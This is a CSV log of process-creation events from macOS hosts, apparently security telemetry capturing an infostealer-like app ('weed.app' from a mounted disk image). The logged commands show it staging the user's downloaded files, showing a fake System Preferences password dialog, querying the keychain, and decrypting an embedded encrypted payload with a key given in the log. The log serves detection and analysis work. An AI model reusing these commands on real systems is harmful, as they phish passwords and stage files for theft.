process.parent.name,process.parent.pid,process.group_leader.pid,process.session_leader.pid,process.pid,process.command_line,process.executable,@timestamp,host.os.family,host.name,user.name
/Volumes/BrewApp/BrewApp,10957,10957,10950,11055,sh -c rm -rf /Users/michael.scott/211052263,/bin/sh,2024-11-21T23:57:01.149Z,darwin,scr-office-imac.local,michael.scott
/bin/sh,10957,10957,10950,11057,"sh -c osascript -e 'display dialog ""Some error occurred while running the application."" buttons {""OK""} default button 1 with icon stop'",/bin/bash,2024-11-21T23:57:01.151Z,darwin,scr-office-imac.local,michael.scott
/bin/sh,10957,10957,10950,11055,sh -c rm -rf /Users/michael.scott/211052263,/bin/bash,2024-11-21T23:57:01.149Z,darwin,scr-office-imac.local,michael.scott
/bin/bash,10957,10957,10950,11055,rm -rf /Users/michael.scott/211052263,/bin/rm,2024-11-21T23:57:01.149Z,darwin,scr-office-imac.local,michael.scott
/bin/bash,10951,11072,10950,11072,/usr/bin/shlock -f /Users/michael.scott/.bash_sessions/_expiration_lockfile -p 10951,/usr/bin/shlock,2024-11-21T23:57:05.155Z,darwin,scr-office-imac.local,michael.scott
/usr/libexec/diskarbitrationd,126,126,126,12351,"/sbin/mount -t apfs -k -o nodev,noowners,nosuid,rdonly /dev/disk3s1 /Volumes/weed",/sbin/mount,2024-11-21T23:57:32.499Z,darwin,scr-it-mac.local,sadiq.khan
/usr/libexec/diskarbitrationd,126,126,126,12348,/System/Library/Filesystems/apfs.fs/Contents/Resources/./apfs.util -p disk3s1 removable readonly,/System/Library/Filesystems/apfs.fs/Contents/Resources/apfs.util,2024-11-21T23:57:32.499Z,darwin,scr-it-mac.local,root
/sbin/launchd,1,1,1,12344,xpcproxy com.apple.mdworker.shared.05000000-0000-0000-0000-000000000000,/usr/libexec/xpcproxy,2024-11-21T23:57:32.493Z,darwin,scr-it-mac.local,root
/usr/libexec/xpcproxy,1,12346,12346,12346,/System/Library/PrivateFrameworks/DiskImages2.framework/Versions/A/XPCServices/diskimagescontroller.xpc/Contents/MacOS/diskimagescontroller,/System/Library/PrivateFrameworks/DiskImages2.framework/Versions/A/XPCServices/diskimagescontroller.xpc/Contents/MacOS/diskimagescontroller,2024-11-21T23:57:32.495Z,darwin,scr-it-mac.local,sadiq.khan
/sbin/launchd,1,1,1,12346,xpcproxy com.apple.diskimagescontroller 12345,/usr/libexec/xpcproxy,2024-11-21T23:57:32.495Z,darwin,scr-it-mac.local,root
/usr/libexec/xpcproxy,1,12344,1,12344,/System/Library/Frameworks/CoreServices.framework/Frameworks/Metadata.framework/Versions/A/Support/mdworker_shared -s mdworker -c MDSImporterWorker -m com.apple.mdworker.shared,/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/Metadata.framework/Versions/A/Support/mdworker_shared,2024-11-21T23:57:32.494Z,darwin,scr-it-mac.local,sadiq.khan
/sbin/launchd,1,1,1,12347,xpcproxy com.apple.diskimagesiod.AE6C1C54-0C58-5C7F-A80C-A5A353B74119,/usr/libexec/xpcproxy,2024-11-21T23:57:32.495Z,darwin,scr-it-mac.local,root
/usr/libexec/xpcproxy,1,12347,12347,12347,/usr/libexec/diskimagesiod,/usr/libexec/diskimagesiod,2024-11-21T23:57:32.498Z,darwin,scr-it-mac.local,_diskimagesiod
/usr/libexec/diskarbitrationd,126,126,126,12349,/System/Library/Filesystems/apfs.fs/Contents/Resources/./apfs.util -k disk3s1,/System/Library/Filesystems/apfs.fs/Contents/Resources/apfs.util,2024-11-21T23:57:32.499Z,darwin,scr-it-mac.local,root
/usr/libexec/xpcproxy,1,12343,1,12343,/System/Library/Frameworks/Quartz.framework/Frameworks/QuickLookUI.framework/Resources/QuickLookUIHelper.app/Contents/MacOS/QuickLookUIHelper,/System/Library/Frameworks/QuickLookUI.framework/Versions/A/Resources/QuickLookUIHelper.app/Contents/MacOS/QuickLookUIHelper,2024-11-21T23:57:32.488Z,darwin,scr-it-mac.local,sadiq.khan
/sbin/launchd,1,1,1,12345,xpcproxy application.com.apple.DiskImageMounter.1152921500312112838.1152921500312112843,/usr/libexec/xpcproxy,2024-11-21T23:57:32.495Z,darwin,scr-it-mac.local,root
/sbin/launchd,1,1,1,12343,xpcproxy com.apple.quicklook.ui.helper,/usr/libexec/xpcproxy,2024-11-21T23:57:32.488Z,darwin,scr-it-mac.local,root
/usr/libexec/xpcproxy,1,12345,1,12345,/System/Library/CoreServices/DiskImageMounter.app/Contents/MacOS/DiskImageMounter,/System/Library/CoreServices/DiskImageMounter.app/Contents/MacOS/DiskImageMounter,2024-11-21T23:57:32.495Z,darwin,scr-it-mac.local,sadiq.khan
/usr/libexec/diskarbitrationd,126,126,126,12350,/System/Library/Filesystems/apfs.fs/Contents/Resources/./fsck_apfs -q /dev/rdisk3s1,/System/Library/Filesystems/apfs.fs/Contents/Resources/fsck_apfs,2024-11-21T23:57:32.499Z,darwin,scr-it-mac.local,root
/sbin/mount,12351,126,126,12352,/sbin/mount_apfs -o nodev -o noowners -o nosuid -o rdonly -o nofollow /dev/disk3s1 /Volumes/weed,/System/Library/Filesystems/apfs.fs/Contents/Resources/mount_apfs,2024-11-21T23:57:33.499Z,darwin,scr-it-mac.local,sadiq.khan
/usr/libexec/xpcproxy,1,12353,1,12353,/Volumes/weed/weed.app/Contents/MacOS/weed,/Volumes/weed/weed.app/Contents/MacOS/weed,2024-11-21T23:57:38.503Z,darwin,scr-it-mac.local,sadiq.khan
/sbin/launchd,1,1,1,12353,xpcproxy application.4D32B7B1B7529E17F6E138C7E4146E31.20.23,/usr/libexec/xpcproxy,2024-11-21T23:57:38.503Z,darwin,scr-it-mac.local,root
/bin/sh,12353,12353,1,12361,sh -c cp '/Users/sadiq.khan/Downloads/WhatsYourSign_2.2.2.zip' /var/folders/5x/8dssd5tj4z9bn6_53jcjd4k4qn1q75/T/44A0VKJ5TPSQ/files/Downloads,/bin/bash,2024-11-21T23:57:39.506Z,darwin,scr-it-mac.local,sadiq.khan
/bin/bash,12353,12353,1,12363,"osascript -e display dialog ""MacOS wants to access the System Preferences"" with title ""System Preferences"" with icon caution default answer """" with hidden answer",/usr/bin/osascript,2024-11-21T23:57:39.507Z,darwin,scr-it-mac.local,sadiq.khan
/bin/sh,12353,12353,1,12362,/bin/sh -c security default-keychain,/bin/bash,2024-11-21T23:57:39.506Z,darwin,scr-it-mac.local,sadiq.khan
/Volumes/weed/weed.app/Contents/MacOS/weed,12353,12353,1,12363,"/bin/sh -c osascript -e 'display dialog ""MacOS wants to access the System Preferences"" with title ""System Preferences"" with icon caution default answer """" with hidden answer' ",/bin/sh,2024-11-21T23:57:39.506Z,darwin,scr-it-mac.local,sadiq.khan
/bin/bash,12353,12353,1,12358,cp /Users/sadiq.khan/Downloads/minesweeper.zip /var/folders/5x/8dssd5tj4z9bn6_53jcjd4k4qn1q75/T/44A0VKJ5TPSQ/files/Downloads,/bin/cp,2024-11-21T23:57:39.506Z,darwin,scr-it-mac.local,sadiq.khan
/Volumes/weed/weed.app/Contents/MacOS/weed,12353,12353,1,12360,sh -c cp '/Users/sadiq.khan/Downloads/flutter.zip' /var/folders/5x/8dssd5tj4z9bn6_53jcjd4k4qn1q75/T/44A0VKJ5TPSQ/files/Downloads,/bin/sh,2024-11-21T23:57:39.506Z,darwin,scr-it-mac.local,sadiq.khan
/Volumes/weed/weed.app/Contents/MacOS/weed,12353,12353,1,12361,sh -c cp '/Users/sadiq.khan/Downloads/WhatsYourSign_2.2.2.zip' /var/folders/5x/8dssd5tj4z9bn6_53jcjd4k4qn1q75/T/44A0VKJ5TPSQ/files/Downloads,/bin/sh,2024-11-21T23:57:39.506Z,darwin,scr-it-mac.local,sadiq.khan
/bin/bash,12353,12353,1,12360,cp /Users/sadiq.khan/Downloads/flutter.zip /var/folders/5x/8dssd5tj4z9bn6_53jcjd4k4qn1q75/T/44A0VKJ5TPSQ/files/Downloads,/bin/cp,2024-11-21T23:57:39.506Z,darwin,scr-it-mac.local,sadiq.khan
/Volumes/weed/weed.app/Contents/MacOS/weed,12353,12353,1,12357,sh -c cp '/Users/sadiq.khan/Downloads/MyApp.zip' /var/folders/5x/8dssd5tj4z9bn6_53jcjd4k4qn1q75/T/44A0VKJ5TPSQ/files/Downloads,/bin/sh,2024-11-21T23:57:39.506Z,darwin,scr-it-mac.local,sadiq.khan
/bin/sh,12353,12353,1,12356,sh -c cp '/Users/sadiq.khan/Downloads/runner.zip' /var/folders/5x/8dssd5tj4z9bn6_53jcjd4k4qn1q75/T/44A0VKJ5TPSQ/files/Downloads,/bin/bash,2024-11-21T23:57:39.506Z,darwin,scr-it-mac.local,sadiq.khan
/bin/bash,12353,12353,1,12359,cp /Users/sadiq.khan/Downloads/gohello.zip /var/folders/5x/8dssd5tj4z9bn6_53jcjd4k4qn1q75/T/44A0VKJ5TPSQ/files/Downloads,/bin/cp,2024-11-21T23:57:39.506Z,darwin,scr-it-mac.local,sadiq.khan
/bin/bash,12354,12353,1,12355,uname -p,/usr/bin/uname,2024-11-21T23:57:39.504Z,darwin,scr-it-mac.local,sadiq.khan
/bin/sh,12353,12353,1,12363,"/bin/sh -c osascript -e 'display dialog ""MacOS wants to access the System Preferences"" with title ""System Preferences"" with icon caution default answer """" with hidden answer' ",/bin/bash,2024-11-21T23:57:39.506Z,darwin,scr-it-mac.local,sadiq.khan
/bin/bash,12353,12353,1,12356,cp /Users/sadiq.khan/Downloads/runner.zip /var/folders/5x/8dssd5tj4z9bn6_53jcjd4k4qn1q75/T/44A0VKJ5TPSQ/files/Downloads,/bin/cp,2024-11-21T23:57:39.506Z,darwin,scr-it-mac.local,sadiq.khan
/bin/sh,12353,12353,1,12359,sh -c cp '/Users/sadiq.khan/Downloads/gohello.zip' /var/folders/5x/8dssd5tj4z9bn6_53jcjd4k4qn1q75/T/44A0VKJ5TPSQ/files/Downloads,/bin/bash,2024-11-21T23:57:39.506Z,darwin,scr-it-mac.local,sadiq.khan
/Volumes/weed/weed.app/Contents/MacOS/weed,12353,12353,1,12358,sh -c cp '/Users/sadiq.khan/Downloads/minesweeper.zip' /var/folders/5x/8dssd5tj4z9bn6_53jcjd4k4qn1q75/T/44A0VKJ5TPSQ/files/Downloads,/bin/sh,2024-11-21T23:57:39.506Z,darwin,scr-it-mac.local,sadiq.khan
/bin/sh,12353,12353,1,12360,sh -c cp '/Users/sadiq.khan/Downloads/flutter.zip' /var/folders/5x/8dssd5tj4z9bn6_53jcjd4k4qn1q75/T/44A0VKJ5TPSQ/files/Downloads,/bin/bash,2024-11-21T23:57:39.506Z,darwin,scr-it-mac.local,sadiq.khan
/bin/sh,12353,12353,1,12354,/bin/sh -c uname -p 2> /dev/null,/bin/bash,2024-11-21T23:57:39.504Z,darwin,scr-it-mac.local,sadiq.khan
/Volumes/weed/weed.app/Contents/MacOS/weed,12353,12353,1,12354,/bin/sh -c uname -p 2> /dev/null,/bin/sh,2024-11-21T23:57:39.504Z,darwin,scr-it-mac.local,sadiq.khan
/bin/sh,12353,12353,1,12357,sh -c cp '/Users/sadiq.khan/Downloads/MyApp.zip' /var/folders/5x/8dssd5tj4z9bn6_53jcjd4k4qn1q75/T/44A0VKJ5TPSQ/files/Downloads,/bin/bash,2024-11-21T23:57:39.506Z,darwin,scr-it-mac.local,sadiq.khan
/Volumes/weed/weed.app/Contents/MacOS/weed,12353,12353,1,12362,/bin/sh -c security default-keychain,/bin/sh,2024-11-21T23:57:39.506Z,darwin,scr-it-mac.local,sadiq.khan
/Volumes/weed/weed.app/Contents/MacOS/weed,12353,12353,1,12356,sh -c cp '/Users/sadiq.khan/Downloads/runner.zip' /var/folders/5x/8dssd5tj4z9bn6_53jcjd4k4qn1q75/T/44A0VKJ5TPSQ/files/Downloads,/bin/sh,2024-11-21T23:57:39.506Z,darwin,scr-it-mac.local,sadiq.khan
/bin/bash,12353,12353,1,12357,cp /Users/sadiq.khan/Downloads/MyApp.zip /var/folders/5x/8dssd5tj4z9bn6_53jcjd4k4qn1q75/T/44A0VKJ5TPSQ/files/Downloads,/bin/cp,2024-11-21T23:57:39.506Z,darwin,scr-it-mac.local,sadiq.khan
/Volumes/weed/weed.app/Contents/MacOS/weed,12353,12353,1,12359,sh -c cp '/Users/sadiq.khan/Downloads/gohello.zip' /var/folders/5x/8dssd5tj4z9bn6_53jcjd4k4qn1q75/T/44A0VKJ5TPSQ/files/Downloads,/bin/sh,2024-11-21T23:57:39.506Z,darwin,scr-it-mac.local,sadiq.khan
/bin/bash,12353,12353,1,12362,security default-keychain,/usr/bin/security,2024-11-21T23:57:39.506Z,darwin,scr-it-mac.local,sadiq.khan
/bin/sh,12353,12353,1,12358,sh -c cp '/Users/sadiq.khan/Downloads/minesweeper.zip' /var/folders/5x/8dssd5tj4z9bn6_53jcjd4k4qn1q75/T/44A0VKJ5TPSQ/files/Downloads,/bin/bash,2024-11-21T23:57:39.506Z,darwin,scr-it-mac.local,sadiq.khan
/bin/bash,12353,12353,1,12361,cp /Users/sadiq.khan/Downloads/WhatsYourSign_2.2.2.zip /var/folders/5x/8dssd5tj4z9bn6_53jcjd4k4qn1q75/T/44A0VKJ5TPSQ/files/Downloads,/bin/cp,2024-11-21T23:57:39.506Z,darwin,scr-it-mac.local,sadiq.khan
/sbin/launchd,1,1,1,12364,xpcproxy com.apple.speech.MacinTalkFramework.WardaSynthesizer.arm64 492,/usr/libexec/xpcproxy,2024-11-21T23:57:40.508Z,darwin,scr-it-mac.local,root
/bin/bash,12353,12353,1,12365,security default-keychain,/usr/bin/security,2024-11-21T23:57:43.511Z,darwin,scr-it-mac.local,sadiq.khan
/bin/bash,12366,12353,1,12367,openssl enc -base64 -d -aes-128-cbc -iv 20202020202020202020202020202020 -K da323ff6cdffbfda38f432ce99668ff4,/usr/bin/openssl,2024-11-21T23:57:43.511Z,darwin,scr-it-mac.local,sadiq.khan
/Volumes/weed/weed.app/Contents/MacOS/weed,12353,12353,1,12365,/bin/sh -c security default-keychain,/bin/sh,2024-11-21T23:57:43.511Z,darwin,scr-it-mac.local,sadiq.khan
/bin/sh,12353,12353,1,12365,/bin/sh -c security default-keychain,/bin/bash,2024-11-21T23:57:43.511Z,darwin,scr-it-mac.local,sadiq.khan
/bin/sh,12353,12353,1,12366,/bin/sh -c openssl enc -base64 -d -aes-128-cbc -iv '20202020202020202020202020202020' -K da323ff6cdffbfda38f432ce99668ff4 <<< 7VPc1d/gGCaglhgOFUSCoTBSgkstP5eUbN3sW47MAZd/7m2zB6prWilEV7757tXO1XdijwagAKeky68HU2YSg1dpZQt48Oa60c63WAcD/L7887R7puFnKJdn77FsJ6fSNU50UYoa41sRB6wEdZpklFyb3yn+AnX/pUVCSIfJSb0mTrl826WT+WcV2h1Ea0HxIU+cJoYjzWLy5l9i0y/piH68bZsYnxPWC07mABoxrmdQ3+vGTO7v1uQ+WemPJCJ7EzL/4aHU6mIkjoqdsVKgJ8gwMypybXP8lSBUczrmUVDhFTfUajHLG4W0f3MlUm86 2>/dev/null,/bin/bash,2024-11-21T23:57:43.511Z,darwin,scr-it-mac.local,sadiq.khan
/Volumes/weed/weed.app/Contents/MacOS/weed,12353,12353,1,12366,/bin/sh -c openssl enc -base64 -d -aes-128-cbc -iv '20202020202020202020202020202020' -K da323ff6cdffbfda38f432ce99668ff4 <<< 7VPc1d/gGCaglhgOFUSCoTBSgkstP5eUbN3sW47MAZd/7m2zB6prWilEV7757tXO1XdijwagAKeky68HU2YSg1dpZQt48Oa60c63WAcD/L7887R7puFnKJdn77FsJ6fSNU50UYoa41sRB6wEdZpklFyb3yn+AnX/pUVCSIfJSb0mTrl826WT+WcV2h1Ea0HxIU+cJoYjzWLy5l9i0y/piH68bZsYnxPWC07mABoxrmdQ3+vGTO7v1uQ+WemPJCJ7EzL/4aHU6mIkjoqdsVKgJ8gwMypybXP8lSBUczrmUVDhFTfUajHLG4W0f3MlUm86 2>/dev/null,/bin/sh,2024-11-21T23:57:43.511Z,darwin,scr-it-mac.local,sadiq.khan
/sbin/launchd,1,1,1,12368,xpcproxy com.apple.speech.MacinTalkFramework.WardaSynthesizer.arm64 492,/usr/libexec/xpcproxy,2024-11-21T23:57:45.514Z,darwin,scr-it-mac.local,root
/bin/bash,12383,12371,12370,12384,dirname ../Homebrew/bin/brew,/usr/bin/dirname,2024-11-21T23:58:09.534Z,darwin,scr-it-mac.local,sadiq.khan
/bin/bash,12376,12371,12370,12391,/bin/ps -p 12375 -c -o comm=,/bin/ps,2024-11-21T23:58:09.535Z,darwin,scr-it-mac.local,sadiq.khan
/usr/bin/env,12375,12371,12370,12376,/bin/bash -p /usr/local/Homebrew/Library/Homebrew/brew.sh shellenv,/bin/bash,2024-11-21T23:58:09.534Z,darwin,scr-it-mac.local,sadiq.khan
/bin/bash,12386,12371,12370,12387,readlink /usr/local/bin/brew,/usr/bin/readlink,2024-11-21T23:58:09.534Z,darwin,scr-it-mac.local,sadiq.khan
/sbin/launchd,1,1,1,12395,xpcproxy com.apple.speech.MacinTalkFramework.WardaSynthesizer.arm64 492,/usr/libexec/xpcproxy,2024-11-21T23:58:11.537Z,darwin,scr-it-mac.local,root
/usr/sbin/sendmail,12401,12400,12400,12402,/usr/sbin/postdrop -r,/usr/sbin/postdrop,2024-11-21T23:58:32.555Z,darwin,scr-it-mac.local,root
/usr/bin/sudo,12400,12400,12400,12401,sendmail -t,/usr/sbin/sendmail,2024-11-21T23:58:32.555Z,darwin,scr-it-mac.local,root
/usr/bin/login,12370,12370,12370,12371,bash -c exec -la bash /bin/bash,/bin/bash,2024-11-21T23:58:09.534Z,darwin,scr-it-mac.local,sadiq.khan
/bin/bash,12375,12371,12370,12376,/usr/bin/env -i HOME=/Users/sadiq.khan SHELL=/bin/bash PATH=/usr/bin:/bin:/usr/sbin:/sbin TERM=xterm-256color LOGNAME=sadiq.khan USER=sadiq.khan SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.1jQWjrBhRE/Listeners HOMEBREW_BREW_FILE=/usr/local/bin/brew HOMEBREW_LIBRARY=/usr/local/Homebrew/Library HOMEBREW_PATH=/usr/local/bin:/System/Cryptexes/App/usr/bin:/usr/bin:/bin:/usr/sbin:/sbin:/var/run/com.apple.security.cryptexd/codex.system/bootstrap/usr/local/bin:/var/run/com.apple.security.cryptexd/codex.system/bootstrap/usr/bin:/var/run/com.apple.security.cryptexd/codex.system/bootstrap/usr/appleinternal/bin HOMEBREW_PREFIX=/usr/local HOMEBREW_REPOSITORY=/usr/local/Homebrew HOMEBREW_TMPDIR=/var/folders/5x/8dssd5tj4z9bn6_53jcjd4k4qn1q75/T/ HOMEBREW_USER_CONFIG_HOME=/Users/sadiq.khan/.homebrew /bin/bash -p /usr/local/Homebrew/Library/Homebrew/brew.sh shellenv,/usr/bin/env,2024-11-21T23:58:09.534Z,darwin,scr-it-mac.local,sadiq.khan
/bin/bash,12371,12371,12370,12374,mkdir -m 700 -p /Users/sadiq.khan/.bash_sessions,/bin/mkdir,2024-11-21T23:58:09.534Z,darwin,scr-it-mac.local,sadiq.khan
/bin/bash,12376,12371,12370,12390,/usr/bin/sw_vers -productVersion,/usr/bin/sw_vers,2024-11-21T23:58:09.534Z,darwin,scr-it-mac.local,sadiq.khan
/usr/libexec/postfix/master,12403,12403,12403,12404,pickup -l -t fifo -u -o content_filter=,/usr/libexec/postfix/pickup,2024-11-21T23:58:33.558Z,darwin,scr-it-mac.local,root
/sbin/launchd,1,1,1,12369,xpcproxy com.apple.speech.MacinTalkFramework.WardaSynthesizer.arm64 492,/usr/libexec/xpcproxy,2024-11-21T23:57:55.522Z,darwin,scr-it-mac.local,root
/bin/bash,12375,12371,12370,12376,/bin/bash -p /usr/local/bin/brew shellenv,/bin/bash,2024-11-21T23:58:09.534Z,darwin,scr-it-mac.local,sadiq.khan
/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal,430,12370,12370,12370,login -pfl sadiq.khan /bin/bash -c exec -la bash /bin/bash,/usr/bin/login,2024-11-21T23:58:09.534Z,darwin,scr-it-mac.local,sadiq.khan
/bin/bash,12372,12371,12370,12373,/usr/libexec/path_helper -s,/usr/libexec/path_helper,2024-11-21T23:58:09.534Z,darwin,scr-it-mac.local,sadiq.khan
/bin/bash,12370,12370,12370,12371,-bash,/bin/bash,2024-11-21T23:58:09.534Z,darwin,scr-it-mac.local,sadiq.khan
/bin/bash,12376,12371,12370,12378,/usr/bin/sudo --reset-timestamp,/usr/bin/sudo,2024-11-21T23:58:09.534Z,darwin,scr-it-mac.local,sadiq.khan
/bin/bash,12376,12371,12370,12392,/usr/libexec/path_helper -s,/usr/libexec/path_helper,2024-11-21T23:58:09.535Z,darwin,scr-it-mac.local,sadiq.khan
/bin/bash,12381,12371,12370,12382,readlink /usr/local/bin/brew,/usr/bin/readlink,2024-11-21T23:58:09.534Z,darwin,scr-it-mac.local,sadiq.khan
/sbin/launchd,1,1,1,12396,xpcproxy com.apple.speech.MacinTalkFramework.WardaSynthesizer.arm64 492,/usr/libexec/xpcproxy,2024-11-21T23:58:15.541Z,darwin,scr-it-mac.local,root
/usr/libexec/postfix/master,12403,12403,12403,12405,qmgr -l -t fifo -u,/usr/libexec/postfix/qmgr,2024-11-21T23:58:33.558Z,darwin,scr-it-mac.local,root
/usr/libexec/postfix/master,12403,12403,12403,12408,local -t unix,/usr/libexec/postfix/local,2024-11-21T23:58:33.559Z,darwin,scr-it-mac.local,root
/bin/bash,12388,12371,12370,12389,dirname ../Homebrew/bin/brew,/usr/bin/dirname,2024-11-21T23:58:09.534Z,darwin,scr-it-mac.local,sadiq.khan
/bin/bash,12393,12393,12370,12394,/usr/bin/touch /Users/sadiq.khan/.bash_sessions/AB4D15F6-9D0A-4F1C-98A3-CDC1FD8780CC.historynew,/usr/bin/touch,2024-11-21T23:58:09.535Z,darwin,scr-it-mac.local,sadiq.khan
/sbin/launchd,1,1,1,12397,xpcproxy com.apple.speech.MacinTalkFramework.WardaSynthesizer.arm64 492,/usr/libexec/xpcproxy,2024-11-21T23:58:25.549Z,darwin,scr-it-mac.local,root
/bin/bash,12371,12398,12370,12398,sudo ./backup.sh,/usr/bin/sudo,2024-11-21T23:58:28.552Z,darwin,scr-it-mac.local,sadiq.khan
/usr/libexec/xpcproxy,1,12403,12403,12403,master -e 60,/usr/libexec/postfix/master,2024-11-21T23:58:33.557Z,darwin,scr-it-mac.local,root
/sbin/launchd,1,1,1,12403,xpcproxy com.apple.postfix.master,/usr/libexec/xpcproxy,2024-11-21T23:58:33.557Z,darwin,scr-it-mac.local,root
